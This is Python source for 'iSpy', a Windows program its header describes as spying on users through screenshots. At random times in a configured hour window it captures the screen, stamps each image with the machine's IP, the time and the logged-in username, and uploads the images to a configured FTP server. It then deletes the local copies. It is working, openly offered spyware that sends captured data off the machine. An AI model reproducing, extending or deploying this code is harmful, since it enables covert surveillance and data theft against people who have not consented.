#!C:\PYTHON26\PYTHON.EXE
# -*- coding: utf-8 -*-

'''
************************************************************************
*iSpy -  Spy on users through screenshots.                             *
*This program is free software: you can redistribute it and/or modify  *
*it under the terms of the GNU General Public License as published by  *
*the Free Software Foundation, either version 3 of the License, or     *
*(at your option) any later version.                                   *
*                                                                      *
*This program is distributed in the hope that it will be useful,       *
*but WITHOUT ANY WARRANTY; without even the implied warranty of        *
*MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See t           *
*GNU General Public License for more details.                          *
                                                                       *
*You should have received a copy of the GNU General Public License     *
*along with this program.  If not, see <http://www.gnu.org/licenses/>. *
************************************************************************
'''

import win32api
import ImageGrab,ImageDraw,ImageFont
import ConfigParser
import time
import datetime
import socket
import random
import ftplib
import os
import glob

os.chdir('C:\Program Files\ispy')

class Ispy:
    
    config = ConfigParser.ConfigParser()
    config.read('ispy.cfg')


    def __init__(self):
        self.screentime()

    
        
    def screenshot(self):
        datetime=time.strftime("%d-%m-%Y %H:%M:%S")
        img = ImageGrab.grab()
        draw = ImageDraw.Draw(img)
        font = ImageFont.truetype("arial.ttf", 40)
        
        draw.text((5,10,),self.getIP(),(0,0,0),font=font)
        draw.text((6,12,),self.getIP(),(255,255,255),font=font)
        draw.text((7,14,),self.getIP(),(255,255,0),font=font)
        
        draw.text((5,50,),datetime,(0,0,0),font=font)
        draw.text((6,52,),datetime,(255,255,255),font=font)
        draw.text((7,54,),datetime,(255,255,0),font=font)
        
        draw.text((5,120,),win32api.GetUserName(),(0,0,0),font=font)
        draw.text((6,122,),win32api.GetUserName(),(255,255,255),font=font)
        draw.text((7,124,),win32api.GetUserName(),(255,255,0),font=font)
        
        
        filename= "Image\\"+time.strftime("%Y-%m-%d_%H.%M.%S")+"_"+\
                  self.getIP()+"_"+win32api.GetUserName()+".jpg"
        img.save(str(filename),'JPEG')
        
        self.ftp()
        
        
    def getIP(self):
        ip=socket.gethostbyname (socket.gethostname ()) 
        return ip

    def screentime(self):
        
        
        hour_start=(self.config.get('interval', 'start'))
        hour_stop=(self.config.get('interval', 'stop'))
        
        times=[]
        for start in range(int(hour_start),int(hour_stop)):
                times.append(str(datetime.time(start,random.randrange(0,59)))[:5])
        sums=len(times)
        res=0
        while True:    
            for start in times:
    
                if str(time.strftime("%H:%M"))==start:
                    if self.ftp()==False:
                        self.screenshot()
                    else:
                        self.screenshot()
                        for files in glob.glob('Image/*.jpg'):
                            os.system('del '+files)
                        
                    res=res+1
                    time.sleep(60)
                else:  
                   res=res+1
                   if res==sums:
                       time.sleep(10)
                       res=0

    def ftp(self):
        
        ftp_server=(self.config.get('ftp','server' ))
        username=(self.config.get('ftp', 'username'))
        password=(self.config.get('ftp', 'password'))
        try:
            s = ftplib.FTP(ftp_server,username,password)
        except:
            return False

        for files in glob.glob('Image/*.jpg'):
            files=files.replace('\\','/')
            f = open(files,'rb')                
            s.storbinary('STOR '+files, f)        
            f.close()                                
        s.quit()
    
if __name__ == '__main__':Ispy()

